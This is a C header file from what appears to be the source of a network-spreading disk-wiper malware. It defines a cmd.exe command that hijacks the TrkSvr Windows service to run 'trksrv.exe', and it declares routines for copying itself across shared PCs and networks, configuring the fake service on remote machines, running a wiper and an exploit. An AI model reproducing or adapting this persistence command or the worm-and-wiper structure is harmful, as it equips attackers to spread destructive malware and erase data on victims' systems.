/******************************************************************************************
    Copyright 2013 Christian Roggia

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
******************************************************************************************/


#define TRKSRV_CMD \
    L"\\System32\\cmd.exe /c \"" \
    L"ping -n 30 127.0.0.1 >nul && " \
    L"sc config TrkSvr binpath= system32\\trksrv.exe && " \
    L"ping -n 10 127.0.0.1 >nul && " \
    L"sc start TrkSvr \""

// You see ivan, if we bash keyboard, randomness is guaranteed
#define ATT_RANDOM \
    "kijjjjnsnjbnncbknbkjadc\r\n" \
    "kjsdjbhjsdbhfcbsjkhdf  jhg jkhg hjk hjk    \r\n" \
    "slkdfjkhsbdfjbsdf \r\n" \
    "klsjdfjhsdkufskjdfh \r\n"

bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv);
bool WriteModuleOnSharedNetwork();
bool WriteModuleOnSharedPCByArgv();

bool CopyCurrentExecutableToTrkSvr();
bool SetupTrkSvrService();
bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path);

bool CopyAndRunWiper();

inline bool Exploit();
inline bool IsFileAccessible(LPCWSTR lpFileName);